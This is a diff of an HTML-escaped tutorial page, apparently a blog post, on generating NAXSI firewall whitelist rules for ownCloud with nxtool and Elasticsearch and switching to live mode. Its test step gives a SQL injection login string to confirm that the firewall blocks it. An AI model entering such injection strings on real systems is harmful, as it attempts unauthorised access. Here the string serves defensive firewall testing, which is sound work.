+{'date': '2016-02-16T14:29:36+00', 'events': [{'zone': 'HEADERS', 'ip': '127.0.0.1', 'uri': '/index.php/apps/files/', 'server': '127.0.0.1', 'content': '', 'var_name': 'cookie', 'coords': [104.195397, 35.86166], 'country': 'CN', 'date': '2016-02-16T14:29:36+00', 'id': '1315'}]}
 
-&lt;p&gt;…&lt;/p&gt;
+...
 
-&lt;p&gt;{‘date’: ‘2016-02-16T14:52:22+00’, ‘events’: [{‘zone’: ‘HEADERS’, ‘ip’: ‘127.0.0.1’, ‘uri’: ‘/index.php/heartbeat’, ‘server’: ‘127.0.0.1’, ‘content’: ‘’, ‘var_name’: ‘cookie’, ‘coords’: [104.195397, 35.86166], ‘country’: ‘CN’, ‘date’: ‘2016-02-16T14:52:22+00’, ‘id’: ‘1315’}, {‘zone’: ‘BODY’, ‘ip’: ‘127.0.0.1’, ‘uri’: ‘/index.php/heartbeat’, ‘server’: ‘127.0.0.1’, ‘content’: ‘’, ‘var_name’: ‘’, ‘coords’: [104.195397, 35.86166], ‘country’: ‘CN’, ‘date’: ‘2016-02-16T14:52:22+00’, ‘id’: ‘16’}]}
+{'date': '2016-02-16T14:52:22+00', 'events': [{'zone': 'HEADERS', 'ip': '127.0.0.1', 'uri': '/index.php/heartbeat', 'server': '127.0.0.1', 'content': '', 'var_name': 'cookie', 'coords': [104.195397, 35.86166], 'country': 'CN', 'date': '2016-02-16T14:52:22+00', 'id': '1315'}, {'zone': 'BODY', 'ip': '127.0.0.1', 'uri': '/index.php/heartbeat', 'server': '127.0.0.1', 'content': '', 'var_name': '', 'coords': [104.195397, 35.86166], 'country': 'CN', 'date': '2016-02-16T14:52:22+00', 'id': '16'}]}
 Written 710 events
 root@18cecd3232a2:/opt#
-```&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;The following command displays the top servers which raised the most exceptions. Also the top URIs and zones which raised exceptions are shown. We need the URI list to generate the whitelists for specific requests.&lt;/p&gt;
 
-&lt;p&gt;&lt;code&gt;
-nxtool.py -x -c /etc/nginx/nxapi.json
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nxtool.py -x -c /etc/nginx/nxapi.json
 # size :1000
 # Whitelist(ing) ratio :
 # Top servers :
@@ -842,24 +1160,23 @@ nxtool.py -x -c /etc/nginx/nxapi.json
 # Top Peer(s) :
 # 127.0.0.1 100.0% (total:710/710)
 root@18cecd3232a2:/opt#
-&lt;/code&gt;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Now generate a whitelist for the first URI and save the &lt;code&gt;BasicRule  wl:1315 &quot;mz:$HEADERS_VAR:cookie&quot;;&lt;/code&gt; in the &lt;code&gt;naxsi_whitelist.rules&lt;/code&gt; file.&lt;/p&gt;
+&lt;p&gt;Now generate a whitelist for the first URI and save the &lt;code class=&quot;highlighter-rouge&quot;&gt;BasicRule  wl:1315 &quot;mz:$HEADERS_VAR:cookie&quot;;&lt;/code&gt; in the &lt;code class=&quot;highlighter-rouge&quot;&gt;naxsi_whitelist.rules&lt;/code&gt; file.&lt;/p&gt;
 
-&lt;p&gt;```
-nxtool.py -c /etc/nginx/nxapi.json -s 127.0.0.1 -f –filter ‘uri /core/img/breadcrumb.svg’ –slack
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nxtool.py -c /etc/nginx/nxapi.json -s 127.0.0.1 -f --filter 'uri /core/img/breadcrumb.svg' --slack
 # size :1000
 #  template :/usr/local/nxapi/tpl/HEADERS/cookies.tpl
 Nb of hits : 106
 #  template matched, generating all rules.
-1 whitelists …
+1 whitelists ...
 #Rule (1315) double encoding !
 #total hits 106
 #peers : 127.0.0.1
 #uri : /core/img/breadcrumb.svg
-#var_name : cookie&lt;/p&gt;
+#var_name : cookie
 
-&lt;p&gt;BasicRule  wl:1315 “mz:$HEADERS_VAR:cookie”;
+BasicRule  wl:1315 &quot;mz:$HEADERS_VAR:cookie&quot;;
 #  template :/usr/local/nxapi/tpl/BODY/url-wide-id.tpl
 Nb of hits : 0
 #  template :/usr/local/nxapi/tpl/BODY/url-wide-id-BODY-NAME.tpl
@@ -887,24 +1204,22 @@ Nb of hits : 0
 #  template :/usr/local/nxapi/tpl/URI/site-wide-id.tpl
 Nb of hits : 0
 root@18cecd3232a2:/opt#
-&lt;code&gt;
-&lt;/code&gt;
-echo “BasicRule  wl:1315 &quot;mz:$HEADERS_VAR:cookie&quot;;” &amp;gt; /etc/nginx/naxsi_whitelist.rules
-```&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo &quot;BasicRule  wl:1315 \&quot;mz:\$HEADERS_VAR:cookie\&quot;;&quot; &amp;gt; /etc/nginx/naxsi_whitelist.rules
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Now tag the request with the corresponding rule inside elasticsearch.&lt;/p&gt;
 
-&lt;p&gt;```
-nxtool.py -c /etc/nginx/nxapi.json -s 127.0.0.1 -w /etc/nginx/naxsi_whitelist.rules –tag
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nxtool.py -c /etc/nginx/nxapi.json -s 127.0.0.1 -w /etc/nginx/naxsi_whitelist.rules --tag
 # size :1000
-#Loading tpl ‘/etc/nginx/naxsi_whitelist.rules’
-TAG RULE :{‘query’: {‘bool’: {‘must’: [{‘match’: {‘id’: ‘1315’}},
-                             {‘match’: {‘zone’: ‘HEADERS’}},
-                             {‘match’: {‘var_name’: ‘cookie’}},
-                             {‘match’: {u’whitelisted’: u’false’}},
-                             {‘match’: {‘server’: ‘127.0.0.1’}}]}},
- ‘size’: ‘0’}
-5151 items to be tagged …
+#Loading tpl '/etc/nginx/naxsi_whitelist.rules'
+TAG RULE :{'query': {'bool': {'must': [{'match': {'id': '1315'}},
+                             {'match': {'zone': 'HEADERS'}},
+                             {'match': {'var_name': 'cookie'}},
+                             {'match': {u'whitelisted': u'false'}},
+                             {'match': {'server': '127.0.0.1'}}]}},
+ 'size': '0'}
+5151 items to be tagged ...
 Tagged 515 events out of 5151
 Tagged 1030 events out of 5151
 Tagged 1545 events out of 5151
@@ -915,16 +1230,16 @@ Tagged 3605 events out of 5151
 Tagged 4120 events out of 5151
 Tagged 4635 events out of 5151
 Tagged 5150 events out of 5151
-Tagged 5151 events out of 5151&lt;/p&gt;
+Tagged 5151 events out of 5151
 
-&lt;p&gt;TAG RULE :{‘from’: 0,
- ‘query’: {‘bool’: {‘must’: [{‘match’: {‘id’: ‘1315’}},
-                             {‘match’: {‘zone’: ‘HEADERS’}},
-                             {‘match’: {‘var_name’: ‘cookie’}},
-                             {‘match’: {u’whitelisted’: u’false’}},
-                             {‘match’: {‘server’: ‘127.0.0.1’}}]}},
- ‘size’: ‘0’}
-178 items to be tagged …
+TAG RULE :{'from': 0,
+ 'query': {'bool': {'must': [{'match': {'id': '1315'}},
+                             {'match': {'zone': 'HEADERS'}},
+                             {'match': {'var_name': 'cookie'}},
+                             {'match': {u'whitelisted': u'false'}},
+                             {'match': {'server': '127.0.0.1'}}]}},
+ 'size': '0'}
+178 items to be tagged ...
 Tagged 17 events out of 178
 Tagged 34 events out of 178
 Tagged 51 events out of 178
@@ -935,16 +1250,16 @@ Tagged 119 events out of 178
 Tagged 136 events out of 178
 Tagged 153 events out of 178
 Tagged 170 events out of 178
-Tagged 178 events out of 178&lt;/p&gt;
+Tagged 178 events out of 178
 
-&lt;p&gt;TAG RULE :{‘from’: 0,
- ‘query’: {‘bool’: {‘must’: [{‘match’: {‘id’: ‘1315’}},
-                             {‘match’: {‘zone’: ‘HEADERS’}},
-                             {‘match’: {‘var_name’: ‘cookie’}},
-                             {‘match’: {u’whitelisted’: u’false’}},
-                             {‘match’: {‘server’: ‘127.0.0.1’}}]}},
- ‘size’: ‘0’}
-123 items to be tagged …
+TAG RULE :{'from': 0,
+ 'query': {'bool': {'must': [{'match': {'id': '1315'}},
+                             {'match': {'zone': 'HEADERS'}},
+                             {'match': {'var_name': 'cookie'}},
+                             {'match': {u'whitelisted': u'false'}},
+                             {'match': {'server': '127.0.0.1'}}]}},
+ 'size': '0'}
+123 items to be tagged ...
 Tagged 12 events out of 123
 Tagged 24 events out of 123
 Tagged 36 events out of 123
@@ -955,44 +1270,43 @@ Tagged 84 events out of 123
 Tagged 96 events out of 123
 Tagged 108 events out of 123
 Tagged 120 events out of 123
-Tagged 123 events out of 123&lt;/p&gt;
+Tagged 123 events out of 123
 
-&lt;p&gt;TAG RULE :{‘from’: 0,
- ‘query’: {‘bool’: {‘must’: [{‘match’: {‘id’: ‘1315’}},
-                             {‘match’: {‘zone’: ‘HEADERS’}},
-                             {‘match’: {‘var_name’: ‘cookie’}},
-                             {‘match’: {u’whitelisted’: u’false’}},
-                             {‘match’: {‘server’: ‘127.0.0.1’}}]}},
- ‘size’: ‘0’}
-99 items to be tagged …
-Tagged 99 events out of 99&lt;/p&gt;
+TAG RULE :{'from': 0,
+ 'query': {'bool': {'must': [{'match': {'id': '1315'}},
+                             {'match': {'zone': 'HEADERS'}},
+                             {'match': {'var_name': 'cookie'}},
+                             {'match': {u'whitelisted': u'false'}},
+                             {'match': {'server': '127.0.0.1'}}]}},
+ 'size': '0'}
+99 items to be tagged ...
+Tagged 99 events out of 99
 
-&lt;p&gt;TAG RULE :{‘from’: 0,
- ‘query’: {‘bool’: {‘must’: [{‘match’: {‘id’: ‘1315’}},
-                             {‘match’: {‘zone’: ‘HEADERS’}},
-                             {‘match’: {‘var_name’: ‘cookie’}},
-                             {‘match’: {u’whitelisted’: u’false’}},
-                             {‘match’: {‘server’: ‘127.0.0.1’}}]}},
- ‘size’: ‘0’}
-49 items to be tagged …
-Tagged 49 events out of 49&lt;/p&gt;
+TAG RULE :{'from': 0,
+ 'query': {'bool': {'must': [{'match': {'id': '1315'}},
+                             {'match': {'zone': 'HEADERS'}},
+                             {'match': {'var_name': 'cookie'}},
+                             {'match': {u'whitelisted': u'false'}},
+                             {'match': {'server': '127.0.0.1'}}]}},
+ 'size': '0'}
+49 items to be tagged ...
+Tagged 49 events out of 49
 
-&lt;p&gt;TAG RULE :{‘from’: 0,
- ‘query’: {‘bool’: {‘must’: [{‘match’: {‘id’: ‘1315’}},
-                             {‘match’: {‘zone’: ‘HEADERS’}},
-                             {‘match’: {‘var_name’: ‘cookie’}},
-                             {‘match’: {u’whitelisted’: u’false’}},
-                             {‘match’: {‘server’: ‘127.0.0.1’}}]}},
- ‘size’: ‘0’}
-0 items to be tagged …&lt;/p&gt;
+TAG RULE :{'from': 0,
+ 'query': {'bool': {'must': [{'match': {'id': '1315'}},
+                             {'match': {'zone': 'HEADERS'}},
+                             {'match': {'var_name': 'cookie'}},
+                             {'match': {u'whitelisted': u'false'}},
+                             {'match': {'server': '127.0.0.1'}}]}},
+ 'size': '0'}
+0 items to be tagged ...
 
-&lt;p&gt;5600 items tagged …
-```&lt;/p&gt;
+5600 items tagged ...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;When you look to the report again, it will confirm, that the number of requests decreased&lt;/p&gt;
 
-&lt;p&gt;&lt;code&gt;
-nxtool.py -x -c /etc/nginx/nxapi.json -s 127.0.0.1
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nxtool.py -x -c /etc/nginx/nxapi.json -s 127.0.0.1
 # size :1000
 # Whitelist(ing) ratio :
 # Top servers :
@@ -1017,61 +1331,60 @@ nxtool.py -x -c /etc/nginx/nxapi.json -s 127.0.0.1
 # ARGS|NAME 6.13% (total:26/424)
 # Top Peer(s) :
 # 127.0.0.1 100.0% (total:424/424)
-&lt;/code&gt;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h2 id=&quot;create-the-second-naxsi-rule&quot;&gt;Create the second NAXSI rule&lt;/h2&gt;
 
-&lt;p&gt;```
-nxtool.py -c /etc/nginx/nxapi.json -s 127.0.0.1 -f –filter ‘uri /index.php/apps/files/ajax/upload.php’ –slack
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nxtool.py -c /etc/nginx/nxapi.json -s 127.0.0.1 -f --filter 'uri /index.php/apps/files/ajax/upload.php' --slack
 # size :1000
 #  template :/usr/local/nxapi/tpl/HEADERS/cookies.tpl
 Nb of hits : 0
 #  template :/usr/local/nxapi/tpl/BODY/url-wide-id.tpl
 Nb of hits : 44
 #  template matched, generating all rules.
-1 whitelists …
+1 whitelists ...
 #msg: A generic whitelist, true for the whole uri
 #Rule (2) request too big, stored on disk and not parsed
 #total hits 44
 #peers : 127.0.0.1
-#uri : /index.php/apps/files/ajax/upload.php&lt;/p&gt;
+#uri : /index.php/apps/files/ajax/upload.php
 
-&lt;p&gt;BasicRule  wl:2 “mz:$URL:/index.php/apps/files/ajax/upload.php|BODY”;
+BasicRule  wl:2 &quot;mz:$URL:/index.php/apps/files/ajax/upload.php|BODY&quot;;
 #  template :/usr/local/nxapi/tpl/BODY/url-wide-id-BODY-NAME.tpl
 Nb of hits : 0
 #  template :/usr/local/nxapi/tpl/BODY/precise-id.tpl
 Nb of hits : 44
 #  template matched, generating all rules.
-1 whitelists …
+1 whitelists ...
 #msg: A generic, precise wl tpl (url+var+id)
 #Rule (2) request too big, stored on disk and not parsed
 #total hits 44
 #peers : 127.0.0.1
-#uri : /index.php/apps/files/ajax/upload.php&lt;/p&gt;
+#uri : /index.php/apps/files/ajax/upload.php
 
-&lt;p&gt;BasicRule  wl:2 “mz:$URL:/index.php/apps/files/ajax/upload.php|BODY”;
+BasicRule  wl:2 &quot;mz:$URL:/index.php/apps/files/ajax/upload.php|BODY&quot;;
 #  template :/usr/local/nxapi/tpl/BODY/var_name-wide-id.tpl
 Nb of hits : 44
 #  template matched, generating all rules.
-1 whitelists …
+1 whitelists ...
 #msg: A generic rule to spot var-name specific WL
 #Rule (2) request too big, stored on disk and not parsed
 #total hits 44
 #peers : 127.0.0.1
-#uri : /index.php/apps/files/ajax/upload.php&lt;/p&gt;
+#uri : /index.php/apps/files/ajax/upload.php
 
-&lt;p&gt;BasicRule  wl:2 “mz:BODY”;
+BasicRule  wl:2 &quot;mz:BODY&quot;;
 #  template :/usr/local/nxapi/tpl/BODY/site-wide-id.tpl
 Nb of hits : 44
 #  template matched, generating all rules.
-1 whitelists …
+1 whitelists ...
 #msg: A generic, wide (id+zone) wl
 #Rule (2) request too big, stored on disk and not parsed
 #total hits 44
 #peers : 127.0.0.1
-#uri : /index.php/apps/files/ajax/upload.php&lt;/p&gt;
+#uri : /index.php/apps/files/ajax/upload.php
 
-&lt;p&gt;BasicRule  wl:2 “mz:BODY”;
+BasicRule  wl:2 &quot;mz:BODY&quot;;
 #  template :/usr/local/nxapi/tpl/ARGS/url-wide-id.tpl
 Nb of hits : 0
 #  template :/usr/local/nxapi/tpl/ARGS/url-wide-id-NAME.tpl
@@ -1089,66 +1402,63 @@ Nb of hits : 0
 #  template :/usr/local/nxapi/tpl/URI/site-wide-id.tpl
 Nb of hits : 0
 root@18cecd3232a2:/opt#
-```&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;NXTOOL creates some rules for the same URI. The Main rule 2 protects against request which are to big and won´t be parsed. If we choose the &lt;code&gt;BasicRule  wl:2 &quot;mz:BODY&quot;;&lt;/code&gt;, we would allow for big requests on all URIs. That is not what we want. Instead, I recommend the &lt;code&gt;BasicRule  wl:2 &quot;mz:$URL:/index.php/apps/files/ajax/upload.php|BODY&quot;;&lt;/code&gt; because this rules allows only big requests for a specific URI.&lt;/p&gt;
+&lt;p&gt;NXTOOL creates some rules for the same URI. The Main rule 2 protects against request which are to big and won´t be parsed. If we choose the &lt;code class=&quot;highlighter-rouge&quot;&gt;BasicRule  wl:2 &quot;mz:BODY&quot;;&lt;/code&gt;, we would allow for big requests on all URIs. That is not what we want. Instead, I recommend the &lt;code class=&quot;highlighter-rouge&quot;&gt;BasicRule  wl:2 &quot;mz:$URL:/index.php/apps/files/ajax/upload.php|BODY&quot;;&lt;/code&gt; because this rules allows only big requests for a specific URI.&lt;/p&gt;
 
-&lt;p&gt;Save the rule in the &lt;code&gt;naxsi_whitelist.rules&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Save the rule in the &lt;code class=&quot;highlighter-rouge&quot;&gt;naxsi_whitelist.rules&lt;/code&gt;.&lt;/p&gt;
 
-&lt;p&gt;&lt;code&gt;
-echo &quot;BasicRule  wl:2 \&quot;mz:\$URL:/index.php/apps/files/ajax/upload.php\|BODY\&quot;;&quot; &amp;gt;&amp;gt; /etc/nginx/naxsi_whitelist.rules
-&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo &quot;BasicRule  wl:2 \&quot;mz:\$URL:/index.php/apps/files/ajax/upload.php\|BODY\&quot;;&quot; &amp;gt;&amp;gt; /etc/nginx/naxsi_whitelist.rules
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Tag the request with the corresponding rule within elasticsearch.&lt;/p&gt;
 
-&lt;p&gt;```
-nxtool.py -c /etc/nginx/nxapi.json -s 127.0.0.1 -w /etc/nginx/naxsi_whitelist.rules –tag
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nxtool.py -c /etc/nginx/nxapi.json -s 127.0.0.1 -w /etc/nginx/naxsi_whitelist.rules --tag
 # size :1000
-#Loading tpl ‘/etc/nginx/naxsi_whitelist.rules’
-TAG RULE :{‘query’: {‘bool’: {‘must’: [{‘match’: {‘id’: ‘1315’}},
-                             {‘match’: {‘zone’: ‘HEADERS’}},
-                             {‘match’: {‘var_name’: ‘cookie’}},
-                             {‘match’: {u’whitelisted’: u’false’}},
-                             {‘match’: {‘server’: ‘127.0.0.1’}}]}},
- ‘size’: ‘0’}
-0 items to be tagged …&lt;/p&gt;
+#Loading tpl '/etc/nginx/naxsi_whitelist.rules'
+TAG RULE :{'query': {'bool': {'must': [{'match': {'id': '1315'}},
+                             {'match': {'zone': 'HEADERS'}},
+                             {'match': {'var_name': 'cookie'}},
+                             {'match': {u'whitelisted': u'false'}},
+                             {'match': {'server': '127.0.0.1'}}]}},
+ 'size': '0'}
+0 items to be tagged ...
 
-&lt;p&gt;TAG RULE :{‘query’: {‘bool’: {‘must’: [{‘match’: {‘id’: ‘2’}},
-                             {‘match’: {‘uri’: ‘/index.php/apps/files/ajax/upload.php’}},
-                             {‘match’: {‘zone’: ‘BODY’}},
-                             {‘match’: {u’whitelisted’: u’false’}},
-                             {‘match’: {‘server’: ‘127.0.0.1’}}]}},
- ‘size’: ‘0’}
-44 items to be tagged …
-Tagged 44 events out of 44&lt;/p&gt;
+TAG RULE :{'query': {'bool': {'must': [{'match': {'id': '2'}},
+                             {'match': {'uri': '/index.php/apps/files/ajax/upload.php'}},
+                             {'match': {'zone': 'BODY'}},
+                             {'match': {u'whitelisted': u'false'}},
+                             {'match': {'server': '127.0.0.1'}}]}},
+ 'size': '0'}
+44 items to be tagged ...
+Tagged 44 events out of 44
 
-&lt;p&gt;TAG RULE :{‘from’: 0,
- ‘query’: {‘bool’: {‘must’: [{‘match’: {‘id’: ‘2’}},
-                             {‘match’: {‘uri’: ‘/index.php/apps/files/ajax/upload.php’}},
-                             {‘match’: {‘zone’: ‘BODY’}},
-                             {‘match’: {u’whitelisted’: u’false’}},
-                             {‘match’: {‘server’: ‘127.0.0.1’}}]}},
- ‘size’: ‘0’}
-44 items to be tagged …
-Tagged 44 events out of 44&lt;/p&gt;
+TAG RULE :{'from': 0,
+ 'query': {'bool': {'must': [{'match': {'id': '2'}},
+                             {'match': {'uri': '/index.php/apps/files/ajax/upload.php'}},
+                             {'match': {'zone': 'BODY'}},
+                             {'match': {u'whitelisted': u'false'}},
+                             {'match': {'server': '127.0.0.1'}}]}},
+ 'size': '0'}
+44 items to be tagged ...
+Tagged 44 events out of 44
 
-&lt;p&gt;TAG RULE :{‘from’: 0,
- ‘query’: {‘bool’: {‘must’: [{‘match’: {‘id’: ‘2’}},
-                             {‘match’: {‘uri’: ‘/index.php/apps/files/ajax/upload.php’}},
-                             {‘match’: {‘zone’: ‘BODY’}},
-                             {‘match’: {u’whitelisted’: u’false’}},
-                             {‘match’: {‘server’: ‘127.0.0.1’}}]}},
- ‘size’: ‘0’}
-0 items to be tagged …&lt;/p&gt;
+TAG RULE :{'from': 0,
+ 'query': {'bool': {'must': [{'match': {'id': '2'}},
+                             {'match': {'uri': '/index.php/apps/files/ajax/upload.php'}},
+                             {'match': {'zone': 'BODY'}},
+                             {'match': {u'whitelisted': u'false'}},
+                             {'match': {'server': '127.0.0.1'}}]}},
+ 'size': '0'}
+0 items to be tagged ...
 
-&lt;p&gt;88 items tagged …
+88 items tagged ...
 root@18cecd3232a2:/opt#
-```&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;Repeat these steps for all other requests until you get a complete whitelist similar to this:&lt;/p&gt;
 
-&lt;p&gt;&lt;code&gt;
-BasicRule  wl:1000 &quot;mz:$URL:/apps/activity/img/delete-color.svg|URL&quot;;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;BasicRule  wl:1000 &quot;mz:$URL:/apps/activity/img/delete-color.svg|URL&quot;;
 BasicRule  wl:1000 &quot;mz:$URL:/apps/files/img/delete.svg|URL&quot;;
 BasicRule  wl:1000 &quot;mz:$URL:/apps/updater/css/updater.css|URL&quot;;
 BasicRule  wl:1000 &quot;mz:$URL:/apps/updater/img/app.svg|URL&quot;;
@@ -1213,12 +1523,11 @@ BasicRule  wl:16 &quot;mz:$URL:/index.php/heartbeat|BODY&quot;;
 BasicRule  wl:2 &quot;mz:$URL:/index.php/apps/files/ajax/upload.php|BODY&quot;;
 BasicRule  wl:2 &quot;mz:$URL:/index.php/avatar/|BODY&quot;;
 BasicRule wl:17 &quot;mz:$URL_X:/remote.php/webdav|$HEADERS_VAR:Accept&quot;; #wl libinjection_sql on header
-&lt;/code&gt;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Save this whitelist to &lt;code&gt;waf/naxsi_whitelist.rules&lt;/code&gt; in the project’s folder. Change the &lt;code&gt;docker-compose.yml&lt;/code&gt; to disable learning mode of NAXSI and switch over to LIVE mode.&lt;/p&gt;
+&lt;p&gt;Save this whitelist to &lt;code class=&quot;highlighter-rouge&quot;&gt;waf/naxsi_whitelist.rules&lt;/code&gt; in the project’s folder. Change the &lt;code class=&quot;highlighter-rouge&quot;&gt;docker-compose.yml&lt;/code&gt; to disable learning mode of NAXSI and switch over to LIVE mode.&lt;/p&gt;
 
-&lt;p&gt;&lt;code&gt;
-waf:
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;waf:
     build: ./waf
     depends_on:
       - app
@@ -1234,23 +1543,21 @@ waf:
     networks:
       - frontend
       - backend_app
-&lt;/code&gt;&lt;/p&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Run &lt;code&gt;docker rm -f owncloud_waf_1&lt;/code&gt; to shutdown and remove the running WAF container. Execute &lt;code&gt;docker-compose -p owncloud build&lt;/code&gt; to create a new image which includes the new &lt;code&gt;naxsi_whitelist.rules&lt;/code&gt;. Start it via &lt;code&gt;docker-compose -p owncloud up -d&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Run &lt;code class=&quot;highlighter-rouge&quot;&gt;docker rm -f owncloud_waf_1&lt;/code&gt; to shutdown and remove the running WAF container. Execute &lt;code class=&quot;highlighter-rouge&quot;&gt;docker-compose -p owncloud build&lt;/code&gt; to create a new image which includes the new &lt;code class=&quot;highlighter-rouge&quot;&gt;naxsi_whitelist.rules&lt;/code&gt;. Start it via &lt;code class=&quot;highlighter-rouge&quot;&gt;docker-compose -p owncloud up -d&lt;/code&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;test-the-naxsi-waf&quot;&gt;Test the NAXSI WAF&lt;/h2&gt;
 
-&lt;p&gt;Watch the log file from the &lt;code&gt;owncloud_waf_1&lt;/code&gt; docker container.&lt;/p&gt;
+&lt;p&gt;Watch the log file from the &lt;code class=&quot;highlighter-rouge&quot;&gt;owncloud_waf_1&lt;/code&gt; docker container.&lt;/p&gt;
 
-&lt;p&gt;&lt;code&gt;
-∅&amp;gt; docker exec -it owncloud_waf_1 tail -f /var/log/nginx/naxsi_error.log
-&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;∅&amp;gt; docker exec -it owncloud_waf_1 tail -f /var/log/nginx/naxsi_error.log
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Go to the owncloud login page and put &lt;code&gt;user’ or 1=1;#&lt;/code&gt; as username and password in the fields. Now you should see an error message in the NAXSI log file.&lt;/p&gt;
+&lt;p&gt;Go to the owncloud login page and put &lt;code class=&quot;highlighter-rouge&quot;&gt;user’ or 1=1;#&lt;/code&gt; as username and password in the fields. Now you should see an error message in the NAXSI log file.&lt;/p&gt;
 
-&lt;p&gt;&lt;code&gt;
-2016/03/30 09:30:39 [error] 15#0: *389 NAXSI_FMT: ip=127.0.0.1&amp;amp;server=127.0.0.1&amp;amp;uri=/&amp;amp;learning=0&amp;amp;vers=0.55rc1&amp;amp;total_processed=112&amp;amp;total_blocked=2&amp;amp;block=1&amp;amp;cscore0=$SQL&amp;amp;score0=4&amp;amp;cscore1=$XSS&amp;amp;score1=8&amp;amp;zone0=BODY&amp;amp;id0=1008&amp;amp;var_name0=user, client: 127.0.0.1, server: owncloud_naxsi, request: &quot;POST / HTTP/1.0&quot;, host: &quot;127.0.0.1:8080&quot;
-&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;2016/03/30 09:30:39 [error] 15#0: *389 NAXSI_FMT: ip=127.0.0.1&amp;amp;server=127.0.0.1&amp;amp;uri=/&amp;amp;learning=0&amp;amp;vers=0.55rc1&amp;amp;total_processed=112&amp;amp;total_blocked=2&amp;amp;block=1&amp;amp;cscore0=$SQL&amp;amp;score0=4&amp;amp;cscore1=$XSS&amp;amp;score1=8&amp;amp;zone0=BODY&amp;amp;id0=1008&amp;amp;var_name0=user, client: 127.0.0.1, server: owncloud_naxsi, request: &quot;POST / HTTP/1.0&quot;, host: &quot;127.0.0.1:8080&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;strong&gt;It’s working. Have FUN!!!&lt;/strong&gt;&lt;/p&gt;
 
@@ -1280,15 +1587,15 @@ waf:
 &lt;h2 id=&quot;license-and-author&quot;&gt;License and Author&lt;/h2&gt;
 
 &lt;ul&gt;
-  &lt;li&gt;Author:: Patrick Muench &lt;a href=&quot;&amp;#109;&amp;#097;&amp;#105;&amp;#108;&amp;#116;&amp;#111;:&amp;#112;&amp;#097;&amp;#116;&amp;#114;&amp;#105;&amp;#099;&amp;#107;&amp;#046;&amp;#109;&amp;#117;&amp;#101;&amp;#110;&amp;#099;&amp;#104;&amp;#049;&amp;#049;&amp;#049;&amp;#049;&amp;#064;&amp;#103;&amp;#109;&amp;#097;&amp;#105;&amp;#108;&amp;#046;&amp;#099;&amp;#111;&amp;#109;&quot;&gt;&amp;#112;&amp;#097;&amp;#116;&amp;#114;&amp;#105;&amp;#099;&amp;#107;&amp;#046;&amp;#109;&amp;#117;&amp;#101;&amp;#110;&amp;#099;&amp;#104;&amp;#049;&amp;#049;&amp;#049;&amp;#049;&amp;#064;&amp;#103;&amp;#109;&amp;#097;&amp;#105;&amp;#108;&amp;#046;&amp;#099;&amp;#111;&amp;#109;&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;Author:: Patrick Muench &lt;a href=&quot;mailto:patrick.muench1111@gmail.com&quot;&gt;patrick.muench1111@gmail.com&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;p&gt;Licensed under the Apache License, Version 2.0 (the “License”);
 you may not use this file except in compliance with the License.
 You may obtain a copy of the License at&lt;/p&gt;
 
